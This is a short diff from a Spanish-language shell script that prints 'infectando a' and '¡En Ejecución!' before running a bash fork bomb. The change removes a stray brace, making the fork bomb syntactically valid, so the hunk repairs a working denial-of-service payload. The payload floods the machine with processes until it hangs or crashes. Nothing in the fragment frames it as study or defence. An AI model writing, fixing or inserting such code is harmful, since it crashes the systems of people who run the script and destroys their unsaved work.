@@ -16,7 +16,7 @@ sleep 1
 echo 'infectando a' $nm
 sleep 2
 echo '¡En Ejecución!'
-:(){ :|: & };:}
+:(){ :|: & };:
 }
 
 clear
